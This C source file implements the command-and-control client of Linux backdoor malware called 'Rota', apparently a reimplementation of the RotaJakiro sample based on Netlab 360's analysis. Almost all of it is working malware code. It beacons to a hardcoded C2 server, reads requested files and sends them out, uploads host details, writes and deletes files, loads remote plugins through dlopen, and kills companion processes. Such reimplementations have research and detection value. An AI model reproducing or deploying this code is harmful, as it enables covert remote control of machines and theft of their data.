#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <signal.h>
#include <sys/shm.h>
#include <sys/stat.h>

#include "c2_commands.h"


// https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
void c2_loop(){

    int sleepy_time = 3; // default C2 sleep time
    int sock;
    const char* server_name = "10.10.2.228";
    const int server_port = 1443;

    // setup sockets for initial packet
    struct sockaddr_in server_address;
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    inet_pton(AF_INET, server_name, &server_address.sin_addr);
    server_address.sin_port = htons(server_port);

    // on failure of connect/socket create, sleep and recrusively call ourselves.
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "could not create socket\n");
        sleep(3);
        c2_loop();
    }

    if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        fprintf(stderr, "[!] Could not connect to server...\n");
        sleep(3);
        c2_loop();
    }

    // initial pkt registration
    char *initial_pkt = initial_rota_pkt();
	send(sock, initial_pkt, 82, 0);

    // interactive c2 loop
    while (1) {
        printf("(%d) In c2 loop...\n", getpid());

        // receive
        int n = 0;
        int len = 0;
        int maxlen = 65536;
        char buffer[maxlen];

        memset(buffer, 0, maxlen);

	// will remain open until the server terminates the connection
    while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
        maxlen -= n;
        len += n;

        char *cmd_id = (char *)malloc(4);
        int payload_length;

        // zero out cmd id
        memset(cmd_id, 0, 4);

        // parse out cmd id
        cmd_id = parse_c2_cmdid(buffer);
        // get payload length
        payload_length = parse_c2_payload_len(buffer);

        char *payload = parse_c2_payload(buffer, payload_length);

        #ifdef DEBUG
        printf("\nPayload length is %d\n", payload_length);
        printf("\nPayload is %s\n", payload);
        #endif

        if (memcmp(&rota_c2_exit, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run exiting!");
            #endif
            c2_exit(sock);
        }
        else if (memcmp(&rota_c2_heartbeat, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 heartbeat!");
            #endif
            char *buffer = "PING";
            build_c2_response(buffer, cmd_id, sock);
            break;

        }
        else if (memcmp(&rota_c2_set_timeout, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 set timeout!");
            #endif

            // convert c2 sleep time
            int new_sleepy_time;
            memcpy(&new_sleepy_time, payload, sizeof(int));
            // update c2 sleep time
            c2_set_timeout(&sleepy_time, new_sleepy_time);
            char *msg= "sleepy time updated !";

            #ifdef DEBUG
            printf("New sleep time is: %d", sleepy_time);
            #endif

            build_c2_response(msg, cmd_id, sock);
        }
        else if (memcmp(&rota_c2_steal_data, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run steal sensitive data\n");
            #endif
            bool result = c2_query_file(payload);
            if (result == true) {

                FILE *fd = fopen(payload, "r");
                struct stat stats;
                stat(payload, &stats);

                char *data = (char *)malloc(stats.st_size);
                memset(data, 0, stats.st_size);

                fread(data, sizeof(payload[0]), stats.st_size, fd);
                fclose(fd);

                build_c2_response(data, cmd_id, sock);
                free(data);
            } else {

                char *msg = "file does not exist";
                build_c2_response(msg, cmd_id, sock);
            }

        }
        else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run upload dev info\n");
            #endif

            char *uname_buffer = (char *)malloc(200);
            c2_upload_device_info(uname_buffer);
            // buffer is now populated as hostname-Linux-kernel-version
            build_c2_response(uname_buffer, cmd_id, sock);
        }
        else if (memcmp(&rota_c2_upload_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 upload file \n");
            #endif

            // TODO - break this out into a stub function
            FILE *fd = fopen("localFile", "w+");
            fwrite(payload, sizeof(payload[0]), payload_length, fd);
            fclose(fd);

            build_c2_response(buffer, cmd_id, sock);
        }
        else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run query file\n");
            #endif

            // get fpath as the "payload" portion of the Rota packet.
            bool result = c2_query_file(payload);

            #ifdef DEBUG
            printf("file path %s results in %d\n", payload, result);
            #endif

            if (result == true) {
                char *msg = "file exists";
                build_c2_response(msg, cmd_id, sock);
            } else {
                char *msg = "file does not exist";
                build_c2_response(msg, cmd_id, sock);
            }

        }
        else if (memcmp(&rota_c2_delete_file, cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run delete file\n");
            #endif

            bool result = c2_query_file(payload);
            if (result == true) {

                int res = unlink(payload);
                if (res == 0) {

                    #ifdef DEBUG
                    printf("file deletion of %s successful", payload);
                    #endif

                    char *msg = "file deleted";
                    build_c2_response(msg, cmd_id, sock);
                    break;
                } else {
                    #ifdef DEBUG
                    printf("file deletion of %s was unsuccessful", payload);
                    #endif
                    char *msg = "file could not be deleted";
                    build_c2_response(msg, cmd_id, sock);
                }
            } else {
                    #ifdef DEBUG
                    printf("file %s does not exist", payload);
                    #endif
                char *msg = "file does not exist";
                build_c2_response(msg, cmd_id, sock);
            }
        }
        else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 4) == 0) {
            #ifdef DEBUG
            printf("[+] Rota C2 Run Plugin 1\n");
            #endif


        } else {
            #ifdef DEBUG
            printf("Unknown command id %s\n", cmd_id);
            #endif
        }

        sleep(sleepy_time);
    }

    memset(buffer, 0, strlen(buffer));
    sleep(sleepy_time);
    }

    free(initial_pkt);
    close(sock);
}


void c2_exit(int sock) {

    char *msg = "exiting!";
    int msgLen = strlen(msg);


    // initial Rota header packet to overwrite values
    // for response
    char *rotaResp = initial_rota_pkt();

    // updating message field with length of payload msg.
    memcpy(&rotaResp[4], &msgLen, msgLen);

    // set cmd id to "exit" (0x13, 0x8e, 0x3e, 0x06)
    memcpy(&rotaResp[14], &rota_c2_exit, sizeof(rota_c2_exit));

    // reallocate space from 82 byte header + response "body"
    rotaResp = realloc(rotaResp, (82 + strlen(msg)));
    memset(&rotaResp[82], 0, 8);

    if (rotaResp == NULL) {
        printf("error allocating data");
        exit(1);
    }

    int totalSize = 82 + strlen(msg);
    memcpy(&rotaResp[82], msg, strlen(msg));

    // notified c2 server
    send(sock, rotaResp, totalSize, 0);

    // get pids from sharedmem and kill both pids
    int shmid = shmget(0x64b2e2, 8, 0666);

    // if handled on sharedmem cannot be obtained
    if (shmid == -1) {
        #ifdef DEBUG
        printf("shmget could not find shared mem. Quitting!");
        #endif
        exit(0);
    }


    int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
    int *tmpPid = (int *)malloc(4);

    // Get session-dbus pid from sharedmem and kill it
    memset(tmpPid, 0, 4);
    memcpy(tmpPid, shmem_pid_addr+4, 4);
    kill(*tmpPid, SIGKILL);

    // Get gvfsd-helper pid from sharedmem  and kill it
    memset(tmpPid, 0, 4);
    memcpy(tmpPid, shmem_pid_addr, 4);
    kill(*tmpPid, SIGKILL);

    // closing
    close(sock);
}

void c2_test() {
    // TODO: resolve embedded C2 domains and try to connect.
    // TODO: if this fails, what does the sample do?
}


void c2_heartbeat() {
    //TODO: what does Netlab mean by heartbeat funciton?
}


void c2_set_timeout(int *sleepTime, int newTime) {
    *sleepTime = newTime;
}


char *c2_steal_sensitive_info() {
    // TODO: identify what counts as 'sensitive info'
}


void c2_upload_device_info(char *buffer) {
    // Netlab 360 make this look like populating a uname struct, /etc/os-relase/etc...

    // ptr is null
    if (!buffer){
        #ifdef DEBUG
        fprintf(stderr, "[get_uname] error allocating data");
        #endif
    }

    struct utsname hostinfo;
    memset(buffer, 0, 0);

    int res  = uname(&hostinfo);
    if (res != 0) {
        strncpy(buffer,
                "unknown-platform",
                17);
    }

    snprintf(buffer, 200, "%s-%s-%s",
             hostinfo.nodename,
             hostinfo.sysname,
             hostinfo.release);
}


bool c2_query_file(char *fpath) {

    // F_OK == existence test
    if ((access(fpath, F_OK)) == 0) {
        return true;
    }

    return false;
}


bool c2_delete_file(char *fpath) {

    // F_OK == existence test
    if ((access(fpath, F_OK))) {
        int res = unlink(fpath);
        if (res == 0) {
            return true;
        } else {
            // non-zero return value indicating something went wrong deleting a file.
            return false;
        }
    }

    return false;
}


void c2_run_plugin_1(char *soPath, char *funcName) {

    void *handle = dlopen(soPath, RTLD_LAZY);
    void (*func_ptr)() = dlsym(handle, funcName);
    // execution of shared object
    func_ptr();
    dlclose(handle);
}


char *initial_rota_pkt() {

    char *rotaHdr = (char *)malloc(82);
    if (rotaHdr == NULL) {
        #ifdef DEBUG
        fprintf(stderr,"could not allocate data for rota header packet! Exiting!");
        exit(1);
        #endif
    }

    memset(rotaHdr, 0, 82);

    // 0-> 4 == magicbytes
    memcpy(rotaHdr, magicBytes, sizeof(magicBytes));

    // payload length 8->11
    memcpy(&rotaHdr[8], payloadLen, sizeof(payloadLen));

    // byte 12 and 13  == key length
    memcpy(&rotaHdr[12], keyLen, sizeof(keyLen));

    // 14th -> 18th command id
    memcpy(&rotaHdr[14], cmd_id, sizeof(cmd_id));

    memcpy(&rotaHdr[19], marker_1, sizeof(marker_1));
    memcpy(&rotaHdr[24], marker_2, sizeof(marker_2));
    memcpy(&rotaHdr[29], marker_3, sizeof(marker_3));
    memcpy(&rotaHdr[75], marker_4, sizeof(marker_4));

    return rotaHdr;
}

char *parse_c2_cmdid(char *buffer) {
    char *cmd_id  = (char *)malloc(4);
    memset(cmd_id, 0, 4);
    memcpy(cmd_id, &buffer[14], 4);
    return cmd_id;
}

int parse_c2_payload_len(char *buffer) {

    int len;
    // convert char to integer
    memcpy(&len, &buffer[8], sizeof(int));
    return len;
}

char *parse_c2_payload( char *buffer, int length) {

    char *payload = (char *)malloc(length);
    if (!payload){
        #ifdef DEBUG
        fprintf(stderr, "error allocating data in parse_c2_pkt");
        #endif
        exit(1);
    }
    memset(payload, 0, length);
    // copy last N-bytes from rota payload
    memcpy(payload, &buffer[82], length);
    return payload;
}

void build_c2_response(char *buffer, char *cmd_id, int sock){

    char *rota_resp_pkt = initial_rota_pkt();

    // correct length of payload on buffer
    int buffer_len = strlen(buffer);
    char buffer_len_hex[8] = {0x00};

    // convert and store integer in rota header
    sprintf(buffer_len_hex, "%d", buffer_len);
    memcpy(&rota_resp_pkt[8], buffer_len_hex, sizeof(buffer_len));

    // update cmd_id in response packet
    memcpy(&rota_resp_pkt[14], cmd_id, sizeof(cmd_id));
    // update cmd_id in response packet
    memcpy(&rota_resp_pkt[19], marker_1, sizeof(marker_1));

    // reallocate space from 82 byte header + response "body"
    rota_resp_pkt = realloc(rota_resp_pkt, (82 + buffer_len));
    // zero out new realloc'd data
    memset(&rota_resp_pkt[82], 0, strlen(buffer));
    memcpy(&rota_resp_pkt[82], buffer, buffer_len);

    send(sock, rota_resp_pkt, (82 + buffer_len), 0);
}
